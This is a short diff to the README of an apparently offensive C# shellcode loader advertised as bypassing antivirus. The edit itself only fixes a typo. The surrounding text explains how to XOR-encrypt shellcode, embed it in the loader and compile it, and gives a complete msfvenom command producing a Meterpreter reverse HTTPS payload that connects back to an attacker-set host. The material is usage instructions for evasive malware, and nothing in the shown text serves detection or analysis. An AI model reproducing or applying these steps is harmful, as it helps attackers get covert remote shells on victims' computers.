@@ -21,7 +21,7 @@ A quick and dirty C# shellcode loader that implements several antivirus bypass a
 
 #### INPUT (Shellcode formats)
 Your shellcode must be in C# format (see examples below) and then encrypted using XOR cipher algorithm.
-Obviously, both the encrypted shellcode and yout XOR key must be added in the file 'CsharpShellCodeLoader.cs' before you compile it.
+Obviously, both the encrypted shellcode and your XOR key must be added in the file 'CsharpShellCodeLoader.cs' before you compile it.
 
 - Metasploit C2 Framework  
   ```msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/path/cert.pem LHOST=IP LPORT=port -a x64 -f raw -o shellcode```  
